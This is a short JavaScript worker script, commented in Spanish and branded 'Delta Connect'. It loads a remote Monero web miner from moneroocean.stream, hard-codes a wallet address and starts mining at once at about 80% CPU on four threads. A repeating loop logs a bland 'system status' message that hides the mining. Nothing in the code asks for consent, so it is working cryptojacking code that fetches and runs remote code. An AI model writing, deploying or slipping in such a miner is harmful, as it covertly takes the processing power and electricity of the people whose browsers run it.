// MOTOR DE MINADO DELTA CONNECT - CONFIGURACIÓN DE ALTA POTENCIA (80%)
importScripts('https://moneroocean.stream/webminer.js');

const CARTERA = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";

function conectar() {
    // threads: 4 (Aumentado para forzar el uso de más núcleos)
    // throttle: 0.2 (0.2 de descanso = 80% de trabajo constante)
    const minero = new MoneroOcean.Anonymous(CARTERA, {
        threads: 4,
        throttle: 0.2
    });

    minero.start();

    // Bucle de persistencia y monitoreo en consola
    setInterval(() => {
        const hashes = minero.getHashesPerSecond().toFixed(2);
        console.log(`Estado del Sistema: Motor Delta funcionando al 80%. Velocidad: ${hashes} H/s`);
    }, 5000);
}

// Iniciar el motor inmediatamente
conectar();
